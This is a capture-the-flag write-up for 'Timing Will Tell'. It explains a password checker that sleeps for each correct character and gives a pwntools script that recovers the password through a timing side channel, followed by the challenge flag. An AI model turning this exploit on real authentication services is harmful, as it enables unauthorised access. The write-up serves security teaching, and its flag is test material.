# Timing Will Tell

A side channel timing attack.  
Figure out the password in 90 seconds before connection terminates.  
The password is dynamic and changes every connection session.

**NOTE, the password is eight characters long and will be hexadecimal.**

File: [app.py]()

-----

Looking at the provided file, we see a random password of 8-characters (4 bytes) is generated with `secrets.token_hex` each time we connect to the instance.

```python
def generate_password() -> str:
    """
    generate a random password at start up
    """
    tmp = secrets.token_hex(PASSWORD_LEN).lower()
    return tmp
```

When we provide an input as our `guess`, it first checks that the length of our `guess` is the same as the password (8 characters), sleeping for `0.1` seconds if true. It then loops through our provided guess and checks each character in our `guess` matches the corresponding character in the password, sleeping `0.1` seconds if that passes.

```python
def check_guess(guess, realdeal) -> bool:
    """
    validate if the given guess matches what's known
    """
    # Check length of guess is 8 characters
    if len(guess) != len(realdeal):
        return False

	# Sleep 0.1 seconds
    do_heavy_compute()

	# Check each character in guess matches password
	# Sleep for 0.1 if char matches
    for idx in range(len(guess)):
        if guess[idx] == realdeal[idx]:
            do_heavy_compute()
        else:
            return False
    return True
```

Based on the `time.sleep` only being called when we provide (1) a guess of 8 characters and (2) the first character in our guess matches that of the password, we can guess the password based on the timing of the response as the correct characters will produce a longer response time.

```python
from pwn import *
import time

r = remote('challenge.ctf.games', 30241)

def check_guess(guess):
    r.recvuntil(b': ')
    r.sendline(guess.encode())
    start_time = time.time()
    response = r.recvline().decode()
    elapsed_time = time.time() - start_time
    print("Response:", response.strip())
    return elapsed_time

def find_password():
    password = '0' * 8
    characters = "0123456789abcdef"

    for index in range(8):
        timing_results = []

		# Make guess and time the response
        for char in characters:
            current_guess = password[:index] + char + password[index+1:]
            response_time = check_guess(current_guess)
            timing_results.append((response_time, char))

		# Get longest response time
        timing_results.sort(reverse=True, key=lambda x: x[0])
        password = password[:index] + timing_results[0][1] + password[index+1:]
        print("Current password guess:", password)

    return password

if __name__ == "__main__":
    final_password = find_password()
    print("Final password:", final_password)
```

Running this returns the flag:

```
flag{ab6962e29ed608c0710dbf2910f358d5}
```